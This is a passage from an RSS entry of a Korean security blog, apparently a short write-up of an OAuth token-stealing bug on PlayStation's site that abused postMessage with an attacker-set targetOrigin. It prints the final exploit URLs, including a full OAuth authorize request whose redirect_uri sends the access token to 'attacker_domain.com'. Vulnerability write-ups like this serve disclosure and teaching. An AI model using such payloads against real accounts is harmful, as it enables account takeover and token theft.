parseResponse(<span class="hljs-built_in">window</span>.location);sendResponseToApp(response);</code></pre><p>호스팅된 위 자바스크립트에서 아래 과정을 통해 access token을 해커의 서버로 전송할 수 있습니다.</p><ol><li>request query를 <code>parseResponse()</code> 함수에서 파싱 한 뒤  <code>sendResponseToApp()</code> 의 매개변수로 전달해 호출합니다.</li><li>query 중 <code>reqeustID</code> 필드 값이 “window” 면 <code>window.opener.postMessage()</code>를 호출합니다.</li><li><code>window.opener.postMessage()</code> 는 첫 번째 매개변수를 두 번째 매개변수인 특정 도메인으로 전달할 수 있습니다. 매개변수로 query와 <code>targetOrigin</code> 필드 값이 전달되면 <code>targetOrigin</code> 도메인으로 query에 포함되어 있는 Access Token을 전송할 수 있습니다.</li></ol><p>이를 이용한 최종 페이로드는 다음과 같습니다.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com </span></code></pre><p>위 페이로드를 OAuth 발급 서버 request query의 <code>redirect_uri</code> 필드 값으로 보내면 Access Token을 탈취할 수 있습니다.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&amp;scope=capone:report_submission,kamaji:game_list,kamaji:get_account_hash,user:account.get,user:account.profile.get,kamaji:social_get_graph,kamaji:ugc:distributor,user:account.identityMapper,kamaji:music_views,kamaji:activity_feed_get_feed_privacy,kamaji:activity_feed_get_news_feed,kamaji:activity_feed_submit_feed_story,kamaji:activity_feed_internal_feed_submit_story,kamaji:account_link_token_web,kamaji:ugc:distributor_web,kamaji:url_preview&amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2&amp;redirect_uri=https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com/&amp;prompt=non</span></code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/access-token-stealing/">access token stealing</category>
      
      <category domain="https://hackyboiz.github.io/tags/playstation/">playstation</category>
      
      <category domain="https://hackyboiz.github.io/tags/javascript/">javascript</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/24/l0ch/2020-11-24/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
